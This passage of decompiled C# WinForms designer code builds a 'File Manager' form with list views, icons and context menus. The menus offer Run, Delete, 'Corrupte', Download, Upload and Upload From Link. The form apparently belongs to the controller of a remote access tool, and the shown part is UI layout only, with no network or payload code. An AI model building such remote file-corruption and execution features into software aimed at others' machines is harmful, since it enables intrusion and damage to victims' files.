				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem7_Click);
				bool flag = this._ToolStripMenuItem7 != null;
				if (flag)
				{
					this._ToolStripMenuItem7.Click -= value2;
				}
				this._ToolStripMenuItem7 = value;
				flag = (this._ToolStripMenuItem7 != null);
				if (flag)
				{
					this._ToolStripMenuItem7.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem8_Click);
				bool flag = this._ToolStripMenuItem8 != null;
				if (flag)
				{
					this._ToolStripMenuItem8.Click -= value2;
				}
				this._ToolStripMenuItem8 = value;
				flag = (this._ToolStripMenuItem8 != null);
				if (flag)
				{
					this._ToolStripMenuItem8.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem9_Click);
				bool flag = this._ToolStripMenuItem9 != null;
				if (flag)
				{
					this._ToolStripMenuItem9.Click -= value2;
				}
				this._ToolStripMenuItem9 = value;
				flag = (this._ToolStripMenuItem9 != null);
				if (flag)
				{
					this._ToolStripMenuItem9.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem OpenDownloadsToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenDownloadsToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.OpenDownloadsToolStripMenuItem_Click);
				bool flag = this._OpenDownloadsToolStripMenuItem != null;
				if (flag)
				{
					this._OpenDownloadsToolStripMenuItem.Click -= value2;
				}
				this._OpenDownloadsToolStripMenuItem = value;
				flag = (this._OpenDownloadsToolStripMenuItem != null);
				if (flag)
				{
					this._OpenDownloadsToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem RarToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RarToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RarToolStripMenuItem_Click);
				bool flag = this._RarToolStripMenuItem != null;
				if (flag)
				{
					this._RarToolStripMenuItem.Click -= value2;
				}
				this._RarToolStripMenuItem = value;
				flag = (this._RarToolStripMenuItem != null);
				if (flag)
				{
					this._RarToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem UnRarToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UnRarToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UnRarToolStripMenuItem_Click);
				bool flag = this._UnRarToolStripMenuItem != null;
				if (flag)
				{
					this._UnRarToolStripMenuItem.Click -= value2;
				}
				this._UnRarToolStripMenuItem = value;
				flag = (this._UnRarToolStripMenuItem != null);
				if (flag)
				{
					this._UnRarToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem UploadFromLinkToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UploadFromLinkToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UploadFromLinkToolStripMenuItem_Click);
				bool flag = this._UploadFromLinkToolStripMenuItem != null;
				if (flag)
				{
					this._UploadFromLinkToolStripMenuItem.Click -= value2;
				}
				this._UploadFromLinkToolStripMenuItem = value;
				flag = (this._UploadFromLinkToolStripMenuItem != null);
				if (flag)
				{
					this._UploadFromLinkToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ContextMenuStrip ContextMenuStrip4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip4 = value;
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem10_Click);
				bool flag = this._ToolStripMenuItem10 != null;
				if (flag)
				{
					this._ToolStripMenuItem10.Click -= value2;
				}
				this._ToolStripMenuItem10 = value;
				flag = (this._ToolStripMenuItem10 != null);
				if (flag)
				{
					this._ToolStripMenuItem10.Click += value2;
				}
			}
		}

		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		internal virtual System.Windows.Forms.Timer Timer2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				bool flag = this._Timer2 != null;
				if (flag)
				{
					this._Timer2.Tick -= value2;
				}
				this._Timer2 = value;
				flag = (this._Timer2 != null);
				if (flag)
				{
					this._Timer2.Tick += value2;
				}
			}
		}

		internal virtual ImageList MG2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MG2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._MG2 = value;
			}
		}

		internal virtual ImageList MG1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MG1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._MG1 = value;
			}
		}

		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		internal virtual ToolStripMenuItem ColerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ColerToolStripMenuItem_Click);
				bool flag = this._ColerToolStripMenuItem != null;
				if (flag)
				{
					this._ColerToolStripMenuItem.Click -= value2;
				}
				this._ColerToolStripMenuItem = value;
				flag = (this._ColerToolStripMenuItem != null);
				if (flag)
				{
					this._ColerToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		internal virtual Button Button3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button3_Click);
				bool flag = this._Button3 != null;
				if (flag)
				{
					this._Button3.Click -= value2;
				}
				this._Button3 = value;
				flag = (this._Button3 != null);
				if (flag)
				{
					this._Button3.Click += value2;
				}
			}
		}

		internal virtual Button Button5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button5_Click);
				bool flag = this._Button5 != null;
				if (flag)
				{
					this._Button5.Click -= value2;
				}
				this._Button5 = value;
				flag = (this._Button5 != null);
				if (flag)
				{
					this._Button5.Click += value2;
				}
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				flag = (this._Button2 != null);
				if (flag)
				{
					this._Button2.Click += value2;
				}
			}
		}

		internal virtual Button Button4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button4_Click);
				bool flag = this._Button4 != null;
				if (flag)
				{
					this._Button4.Click -= value2;
				}
				this._Button4 = value;
				flag = (this._Button4 != null);
				if (flag)
				{
					this._Button4.Click += value2;
				}
			}
		}

		internal virtual Panel Panel2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel2 = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Frm_FileManager.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Frm_FileManager.__ENCList.Count == Frm_FileManager.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Frm_FileManager.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Frm_FileManager.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Frm_FileManager.__ENCList[num] = Frm_FileManager.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Frm_FileManager.__ENCList.RemoveRange(num, Frm_FileManager.__ENCList.Count - num);
						Frm_FileManager.__ENCList.Capacity = Frm_FileManager.__ENCList.Count;
					}
					Frm_FileManager.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Frm_FileManager));
			this.StatusStrip1 = new StatusStrip();
			this.ToolStripStatusLabel1 = new ToolStripStatusLabel();
			this.SL = new ToolStripStatusLabel();
			this.pr = new ToolStripProgressBar();
			this.Timer1 = new System.Windows.Forms.Timer(this.components);
			this.L1 = new ListView();
			this.ColumnHeader1 = new ColumnHeader();
			this.ColumnHeader2 = new ColumnHeader();
			this.ContextMenuStrip4 = new ContextMenuStrip(this.components);
			this.ToolStripMenuItem10 = new ToolStripMenuItem();
			this.MG2 = new ImageList(this.components);
			this.MG1 = new ImageList(this.components);
			this.MG = new ImageList(this.components);
			this.ContextMenuStrip1 = new ContextMenuStrip(this.components);
			this.RefreshToolStripMenuItem = new ToolStripMenuItem();
			this.ContextMenuStrip2 = new ContextMenuStrip(this.components);
			this.UPToolStripMenuItem = new ToolStripMenuItem();
			this.RefreshToolStripMenuItem1 = new ToolStripMenuItem();
			this.RunToolStripMenuItem = new ToolStripMenuItem();
			this.DeleteToolStripMenuItem = new ToolStripMenuItem();
			this.CorrupteToolStripMenuItem = new ToolStripMenuItem();
			this.EditToolStripMenuItem = new ToolStripMenuItem();
			this.RenameToolStripMenuItem = new ToolStripMenuItem();
			this.CopyToolStripMenuItem = new ToolStripMenuItem();
			this.CutToolStripMenuItem = new ToolStripMenuItem();
			this.PastToolStripMenuItem = new ToolStripMenuItem();
			this.DownloadToolStripMenuItem = new ToolStripMenuItem();
			this.UploadToolStripMenuItem = new ToolStripMenuItem();
			this.NewEmptyFileToolStripMenuItem = new ToolStripMenuItem();
			this.NewFolderToolStripMenuItem = new ToolStripMenuItem();
			this.OpenFolderToolStripMenuItem = new ToolStripMenuItem();
			this.L2 = new ListView();
			this.ColumnHeader3 = new ColumnHeader();
			this.ColumnHeader4 = new ColumnHeader();
			this.ColumnHeader5 = new ColumnHeader();
			this.ContextMenuStrip3 = new ContextMenuStrip(this.components);
			this.ToolStripMenuItem1 = new ToolStripMenuItem();
			this.RefreshToolStripMenuItem2 = new ToolStripMenuItem();
			this.ToolStripMenuItem2 = new ToolStripMenuItem();
			this.DeleteToolStripMenuItem1 = new ToolStripMenuItem();
			this.EditToolStripMenuItem1 = new ToolStripMenuItem();
			this.ToolStripMenuItem3 = new ToolStripMenuItem();
			this.ToolStripMenuItem4 = new ToolStripMenuItem();
			this.ToolStripMenuItem5 = new ToolStripMenuItem();
			this.PasteToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripMenuItem6 = new ToolStripMenuItem();
			this.ToolStripMenuItem7 = new ToolStripMenuItem();
			this.ToolStripMenuItem8 = new ToolStripMenuItem();
			this.ToolStripMenuItem9 = new ToolStripMenuItem();
			this.OpenDownloadsToolStripMenuItem = new ToolStripMenuItem();
			this.RarToolStripMenuItem = new ToolStripMenuItem();
			this.UnRarToolStripMenuItem = new ToolStripMenuItem();
			this.UploadFromLinkToolStripMenuItem = new ToolStripMenuItem();
			this.ColerToolStripMenuItem = new ToolStripMenuItem();
			this.ProgressBar1 = new ProgressBar();
			this.Timer2 = new System.Windows.Forms.Timer(this.components);
			this.TextBox1 = new TextBox();
			this.Panel1 = new Panel();
			this.Button3 = new Button();
			this.Button5 = new Button();
			this.Button1 = new Button();
			this.Button2 = new Button();
			this.Button4 = new Button();
			this.Panel2 = new Panel();
			this.StatusStrip1.SuspendLayout();
			this.ContextMenuStrip4.SuspendLayout();
			this.ContextMenuStrip1.SuspendLayout();
			this.ContextMenuStrip2.SuspendLayout();
			this.ContextMenuStrip3.SuspendLayout();
			this.Panel1.SuspendLayout();
			this.Panel2.SuspendLayout();
			this.SuspendLayout();
			this.StatusStrip1.BackColor = Color.Black;
			this.StatusStrip1.Items.AddRange(new ToolStripItem[]
			{
				this.ToolStripStatusLabel1,
				this.SL,
				this.pr
			});
			Control arg_40B_0 = this.StatusStrip1;
			Point location = new Point(0, 334);
			arg_40B_0.Location = location;
			this.StatusStrip1.Name = "StatusStrip1";
			Control arg_439_0 = this.StatusStrip1;
			Size size = new Size(734, 22);
			arg_439_0.Size = size;
			this.StatusStrip1.TabIndex = 0;
			this.StatusStrip1.Text = "StatusStrip1";
			this.ToolStripStatusLabel1.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.ToolStripStatusLabel1.ForeColor = Color.White;
			this.ToolStripStatusLabel1.LinkColor = Color.DeepSkyBlue;
			this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
			ToolStripItem arg_4C2_0 = this.ToolStripStatusLabel1;
			size = new Size(42, 17);
			arg_4C2_0.Size = size;
			this.ToolStripStatusLabel1.Text = "Status:";
			this.SL.Name = "SL";
			ToolStripItem arg_4FE_0 = this.SL;
			size = new Size(13, 17);
			arg_4FE_0.Size = size;
			this.SL.Text = "..";
			this.pr.Name = "pr";
			ToolStripControlHost arg_53A_0 = this.pr;
			size = new Size(100, 16);
			arg_53A_0.Size = size;
			this.L1.BackColor = Color.Black;
			this.L1.Columns.AddRange(new ColumnHeader[]
			{
				this.ColumnHeader1,
				this.ColumnHeader2
			});
			this.L1.ContextMenuStrip = this.ContextMenuStrip4;
			this.L1.Dock = DockStyle.Left;
			this.L1.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.L1.ForeColor = Color.LightSteelBlue;
			this.L1.LargeImageList = this.MG2;
			Control arg_5F4_0 = this.L1;
			location = new Point(0, 0);
			arg_5F4_0.Location = location;
			this.L1.Name = "L1";
			Control arg_625_0 = this.L1;
			size = new Size(155, 334);
			arg_625_0.Size = size;
			this.L1.SmallImageList = this.MG1;
			this.L1.TabIndex = 1;
			this.L1.UseCompatibleStateImageBehavior = false;
			this.L1.View = View.Details;
			this.ColumnHeader1.Text = "Name";
			this.ColumnHeader1.Width = 80;
			this.ColumnHeader2.Text = "Type";
			this.ColumnHeader2.Width = 87;
			this.ContextMenuStrip4.Items.AddRange(new ToolStripItem[]
			{
				this.ToolStripMenuItem10
			});
			this.ContextMenuStrip4.Name = "ContextMenuStrip1";
			Control arg_6EA_0 = this.ContextMenuStrip4;
			size = new Size(114, 26);
			arg_6EA_0.Size = size;
			this.ToolStripMenuItem10.BackColor = Color.Black;
			this.ToolStripMenuItem10.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem10.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem10.Image");
			this.ToolStripMenuItem10.Name = "ToolStripMenuItem10";
			ToolStripItem arg_753_0 = this.ToolStripMenuItem10;
			size = new Size(113, 22);
			arg_753_0.Size = size;
			this.ToolStripMenuItem10.Text = "Refresh";
			this.MG2.ImageStream = (ImageListStreamer)componentResourceManager.GetObject("MG2.ImageStream");
			this.MG2.TransparentColor = Color.Transparent;
			this.MG2.Images.SetKeyName(0, "ايقونه.png");
			this.MG2.Images.SetKeyName(1, "1.png");
			this.MG2.Images.SetKeyName(2, "ايقونه.png");
			this.MG2.Images.SetKeyName(3, "2.png");
			this.MG2.Images.SetKeyName(4, "3.png");
			this.MG2.Images.SetKeyName(5, "4.png");
			this.MG2.Images.SetKeyName(6, "5.png");
			this.MG2.Images.SetKeyName(7, "6.png");
			this.MG2.Images.SetKeyName(8, "7.png");
			this.MG2.Images.SetKeyName(9, "8.png");
			this.MG2.Images.SetKeyName(10, "9.png");
			this.MG2.Images.SetKeyName(11, "10.png");
			this.MG2.Images.SetKeyName(12, "11.png");
			this.MG2.Images.SetKeyName(13, "12.png");
			this.MG2.Images.SetKeyName(14, "13.png");
			this.MG2.Images.SetKeyName(15, "14.png");
			this.MG2.Images.SetKeyName(16, "15.png");
			this.MG2.Images.SetKeyName(17, "16.png");
			this.MG2.Images.SetKeyName(18, "17.png");
			this.MG2.Images.SetKeyName(19, "18.png");
			this.MG2.Images.SetKeyName(20, "19.png");
			this.MG2.Images.SetKeyName(21, "20.png");
			this.MG2.Images.SetKeyName(22, "21.png");
			this.MG2.Images.SetKeyName(23, "22.png");
			this.MG2.Images.SetKeyName(24, "23.png");
			this.MG2.Images.SetKeyName(25, "24.png");
			this.MG2.Images.SetKeyName(26, "25.png");
			this.MG2.Images.SetKeyName(27, "26.png");
			this.MG2.Images.SetKeyName(28, "27.png");
			this.MG2.Images.SetKeyName(29, "28.png");
			this.MG2.Images.SetKeyName(30, "29.png");
			this.MG2.Images.SetKeyName(31, "30.png");
			this.MG2.Images.SetKeyName(32, "31.png");
			this.MG2.Images.SetKeyName(33, "32.png");
			this.MG2.Images.SetKeyName(34, "33.png");
			this.MG2.Images.SetKeyName(35, "34.png");
			this.MG2.Images.SetKeyName(36, "0.png");
			this.MG1.ImageStream = (ImageListStreamer)componentResourceManager.GetObject("MG1.ImageStream");
			this.MG1.TransparentColor = Color.Transparent;
			this.MG1.Images.SetKeyName(0, "ايقونه.png");
			this.MG1.Images.SetKeyName(1, "1.png");
			this.MG1.Images.SetKeyName(2, "2.png");
			this.MG1.Images.SetKeyName(3, "3.png");
			this.MG1.Images.SetKeyName(4, "4.png");
			this.MG1.Images.SetKeyName(5, "5.png");
			this.MG1.Images.SetKeyName(6, "6.png");
			this.MG1.Images.SetKeyName(7, "7.png");
			this.MG1.Images.SetKeyName(8, "8.png");
			this.MG1.Images.SetKeyName(9, "9.png");
			this.MG1.Images.SetKeyName(10, "10.png");
			this.MG1.Images.SetKeyName(11, "11.png");
			this.MG1.Images.SetKeyName(12, "12.png");
			this.MG1.Images.SetKeyName(13, "13.png");
			this.MG1.Images.SetKeyName(14, "14.png");
			this.MG1.Images.SetKeyName(15, "15.png");
			this.MG1.Images.SetKeyName(16, "16.png");
			this.MG1.Images.SetKeyName(17, "17.png");
			this.MG1.Images.SetKeyName(18, "18.png");
			this.MG1.Images.SetKeyName(19, "19.png");
			this.MG1.Images.SetKeyName(20, "20.png");
			this.MG1.Images.SetKeyName(21, "21.png");
			this.MG1.Images.SetKeyName(22, "22.png");
			this.MG1.Images.SetKeyName(23, "23.png");
			this.MG1.Images.SetKeyName(24, "24.png");
			this.MG1.Images.SetKeyName(25, "25.png");
			this.MG1.Images.SetKeyName(26, "26.png");
			this.MG1.Images.SetKeyName(27, "27.png");
			this.MG1.Images.SetKeyName(28, "28.png");
			this.MG1.Images.SetKeyName(29, "29.png");
			this.MG1.Images.SetKeyName(30, "30.png");
			this.MG1.Images.SetKeyName(31, "31.png");
			this.MG1.Images.SetKeyName(32, "32.png");
			this.MG1.Images.SetKeyName(33, "33.png");
			this.MG1.Images.SetKeyName(34, "34.png");
			this.MG.ImageStream = (ImageListStreamer)componentResourceManager.GetObject("MG.ImageStream");
			this.MG.TransparentColor = Color.Transparent;
			this.MG.Images.SetKeyName(0, "ايقونه.png");
			this.MG.Images.SetKeyName(1, "Folder.ico");
			this.MG.Images.SetKeyName(2, "cd.png");
			this.MG.Images.SetKeyName(3, "15.png");
			this.MG.Images.SetKeyName(4, "4.png");
			this.MG.Images.SetKeyName(5, "txt.ico");
			this.MG.Images.SetKeyName(6, "6.png");
			this.MG.Images.SetKeyName(7, "7.png");
			this.MG.Images.SetKeyName(8, "8.png");
			this.MG.Images.SetKeyName(9, "9.png");
			this.MG.Images.SetKeyName(10, "10.png");
			this.MG.Images.SetKeyName(11, "wmv.ico");
			this.MG.Images.SetKeyName(12, "12.png");
			this.MG.Images.SetKeyName(13, "13.png");
			this.MG.Images.SetKeyName(14, "14.png");
			this.MG.Images.SetKeyName(15, "15.png");
			this.MG.Images.SetKeyName(16, "16.png");
			this.MG.Images.SetKeyName(17, "17.png");
			this.MG.Images.SetKeyName(18, "18.png");
			this.MG.Images.SetKeyName(19, "19.png");
			this.MG.Images.SetKeyName(20, "Google-Chrome-Google-Chrome.ico");
			this.MG.Images.SetKeyName(21, "21.png");
			this.MG.Images.SetKeyName(22, "22.png");
			this.MG.Images.SetKeyName(23, "23.png");
			this.MG.Images.SetKeyName(24, "24.png");
			this.MG.Images.SetKeyName(25, "25.png");
			this.MG.Images.SetKeyName(26, "26.png");
			this.MG.Images.SetKeyName(27, "27.png");
			this.MG.Images.SetKeyName(28, "28.png");
			this.MG.Images.SetKeyName(29, "29.png");
			this.MG.Images.SetKeyName(30, "30.png");
			this.MG.Images.SetKeyName(31, "31.png");
			this.MG.Images.SetKeyName(32, "32.png");
			this.MG.Images.SetKeyName(33, "33.png");
			this.MG.Images.SetKeyName(34, "34.png");
			this.ContextMenuStrip1.BackColor = Color.FromArgb(28, 28, 28);
			this.ContextMenuStrip1.Items.AddRange(new ToolStripItem[]
			{
				this.RefreshToolStripMenuItem
			});
			this.ContextMenuStrip1.Name = "ContextMenuStrip1";
			Control arg_123D_0 = this.ContextMenuStrip1;
			size = new Size(114, 26);
			arg_123D_0.Size = size;
			this.RefreshToolStripMenuItem.BackColor = Color.FromArgb(28, 28, 28);
			this.RefreshToolStripMenuItem.ForeColor = Color.White;
			this.RefreshToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("RefreshToolStripMenuItem.Image");
			this.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem";
			ToolStripItem arg_12AC_0 = this.RefreshToolStripMenuItem;
			size = new Size(113, 22);
			arg_12AC_0.Size = size;
			this.RefreshToolStripMenuItem.Text = "Refresh";
			this.ContextMenuStrip2.BackColor = Color.Black;
			this.ContextMenuStrip2.Items.AddRange(new ToolStripItem[]
			{
				this.UPToolStripMenuItem,
				this.RefreshToolStripMenuItem1,
				this.RunToolStripMenuItem,
				this.DeleteToolStripMenuItem,
				this.CorrupteToolStripMenuItem,
				this.EditToolStripMenuItem,
				this.RenameToolStripMenuItem,
				this.CopyToolStripMenuItem,
				this.CutToolStripMenuItem,
				this.PastToolStripMenuItem,
				this.DownloadToolStripMenuItem,
				this.UploadToolStripMenuItem,
				this.NewEmptyFileToolStripMenuItem,
				this.NewFolderToolStripMenuItem,
				this.OpenFolderToolStripMenuItem
			});
			this.ContextMenuStrip2.Name = "ContextMenuStrip2";
			this.ContextMenuStrip2.RenderMode = ToolStripRenderMode.System;
			Control arg_13C2_0 = this.ContextMenuStrip2;
			size = new Size(197, 334);
			arg_13C2_0.Size = size;
			this.UPToolStripMenuItem.BackColor = Color.Black;
			this.UPToolStripMenuItem.ForeColor = Color.White;
			this.UPToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("UPToolStripMenuItem.Image");
			this.UPToolStripMenuItem.Name = "UPToolStripMenuItem";
			ToolStripItem arg_142E_0 = this.UPToolStripMenuItem;
			size = new Size(196, 22);
			arg_142E_0.Size = size;
			this.UPToolStripMenuItem.Text = "Back";
			this.RefreshToolStripMenuItem1.BackColor = Color.Black;
			this.RefreshToolStripMenuItem1.ForeColor = Color.White;
			this.RefreshToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("RefreshToolStripMenuItem1.Image");
			this.RefreshToolStripMenuItem1.Name = "RefreshToolStripMenuItem1";
			ToolStripItem arg_14AB_0 = this.RefreshToolStripMenuItem1;
			size = new Size(196, 22);
			arg_14AB_0.Size = size;
			this.RefreshToolStripMenuItem1.Text = "Refresh";
			this.RunToolStripMenuItem.BackColor = Color.Black;
			this.RunToolStripMenuItem.ForeColor = Color.White;
			this.RunToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("RunToolStripMenuItem.Image");
			this.RunToolStripMenuItem.Name = "RunToolStripMenuItem";
			ToolStripItem arg_1528_0 = this.RunToolStripMenuItem;
			size = new Size(196, 22);
			arg_1528_0.Size = size;
			this.RunToolStripMenuItem.Text = "Run";
			this.DeleteToolStripMenuItem.BackColor = Color.Black;
			this.DeleteToolStripMenuItem.ForeColor = Color.White;
			this.DeleteToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("DeleteToolStripMenuItem.Image");
			this.DeleteToolStripMenuItem.Name = "DeleteToolStripMenuItem";
			ToolStripItem arg_15A5_0 = this.DeleteToolStripMenuItem;
			size = new Size(196, 22);
			arg_15A5_0.Size = size;
			this.DeleteToolStripMenuItem.Text = "Delete";
			this.CorrupteToolStripMenuItem.BackColor = Color.Black;
			this.CorrupteToolStripMenuItem.ForeColor = Color.White;
			this.CorrupteToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("CorrupteToolStripMenuItem.Image");
			this.CorrupteToolStripMenuItem.Name = "CorrupteToolStripMenuItem";
			ToolStripItem arg_1622_0 = this.CorrupteToolStripMenuItem;
			size = new Size(196, 22);
			arg_1622_0.Size = size;
			this.CorrupteToolStripMenuItem.Text = "Corrupte";
			this.EditToolStripMenuItem.BackColor = Color.Black;
			this.EditToolStripMenuItem.ForeColor = Color.White;
			this.EditToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("EditToolStripMenuItem.Image");
			this.EditToolStripMenuItem.Name = "EditToolStripMenuItem";
			ToolStripItem arg_169F_0 = this.EditToolStripMenuItem;
			size = new Size(196, 22);
			arg_169F_0.Size = size;
			this.EditToolStripMenuItem.Text = "Edit";
			this.RenameToolStripMenuItem.BackColor = Color.Black;
			this.RenameToolStripMenuItem.ForeColor = Color.White;
			this.RenameToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("RenameToolStripMenuItem.Image");
			this.RenameToolStripMenuItem.Name = "RenameToolStripMenuItem";
			ToolStripItem arg_171C_0 = this.RenameToolStripMenuItem;
			size = new Size(196, 22);
			arg_171C_0.Size = size;
			this.RenameToolStripMenuItem.Text = "Rename";
			this.CopyToolStripMenuItem.BackColor = Color.Black;
			this.CopyToolStripMenuItem.ForeColor = Color.White;
			this.CopyToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("CopyToolStripMenuItem.Image");
			this.CopyToolStripMenuItem.Name = "CopyToolStripMenuItem";
			ToolStripItem arg_1799_0 = this.CopyToolStripMenuItem;
			size = new Size(196, 22);
			arg_1799_0.Size = size;
			this.CopyToolStripMenuItem.Text = "Copy";
			this.CutToolStripMenuItem.BackColor = Color.Black;
			this.CutToolStripMenuItem.ForeColor = Color.White;
			this.CutToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("CutToolStripMenuItem.Image");
			this.CutToolStripMenuItem.Name = "CutToolStripMenuItem";
			ToolStripItem arg_1816_0 = this.CutToolStripMenuItem;
			size = new Size(196, 22);
			arg_1816_0.Size = size;
			this.CutToolStripMenuItem.Text = "Cut";
			this.PastToolStripMenuItem.BackColor = Color.Black;
			this.PastToolStripMenuItem.ForeColor = Color.White;
